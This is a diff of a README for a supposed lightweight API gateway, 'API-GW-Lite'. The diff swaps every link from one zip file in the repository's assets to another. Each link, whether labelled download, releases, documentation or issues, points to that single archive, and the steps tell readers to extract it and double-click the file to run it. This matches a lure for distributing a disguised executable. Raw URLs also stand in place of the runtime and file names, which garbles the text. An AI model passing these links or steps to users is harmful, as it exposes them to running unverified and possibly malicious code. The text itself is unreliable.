@@ -1,6 +1,6 @@
 # 🚀 API-GW-Lite - Lightweight API Gateway Made Easy
 
-[![Download API-GW-Lite](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip)](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip)
+[![Download API-GW-Lite](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip)](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ API-GW-Lite is a lightweight API gateway proxy designed to simplify your web aut
 Before you begin, ensure your system meets the following requirements:
 
 - Operating System: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
-- https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip Version 12 or later.
+- https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip Version 12 or later.
 - Internet Connection: Required for downloading and using the application.
 
 ### 🔥 Features
@@ -25,22 +25,22 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download API-GW-Lite, visit this page: [Download API-GW-Lite](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip).
+To download API-GW-Lite, visit this page: [Download API-GW-Lite](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip).
 
-On the Releases page, you will find the latest version of API-GW-Lite. Look for a downloadable file with a name like `https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip` or similar. Click on it to begin the download.
+On the Releases page, you will find the latest version of API-GW-Lite. Look for a downloadable file with a name like `https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip` or similar. Click on it to begin the download.
 
 ### 🔧 Installation Steps
 
 1. **Download the Tool:**
-   - Go to the [Download API-GW-Lite](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip) page.
-   - Click the latest version link to download the file (e.g., `https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip`).
+   - Go to the [Download API-GW-Lite](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip) page.
+   - Click the latest version link to download the file (e.g., `https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip`).
 
 2. **Extract Files:**
    - Locate the downloaded file on your computer.
    - Right-click on the file and select "Extract All" to unzip the contents.
 
 3. **Run the Application:**
-   - Double-click on the `https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip` (or relevant file for your OS) in the extracted folder to start the application.
+   - Double-click on the `https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip` (or relevant file for your OS) in the extracted folder to start the application.
 
 4. **Configure Your Gateway:**
    - Follow the on-screen instructions to set up your API endpoints.
@@ -62,8 +62,8 @@ We welcome contributions that help improve API-GW-Lite. Follow these simple step
 
 ## 🔗 Useful Links
 
-- [API-GW-Lite Documentation](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/images/activites/4_small/Lite-AP-G-v1.1.zip)
+- [API-GW-Lite Documentation](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/r78florea/API-GW-Lite/master/assets/AP-Lite-G-2.4.zip)
 
 ## 🌟 Acknowledgments
 
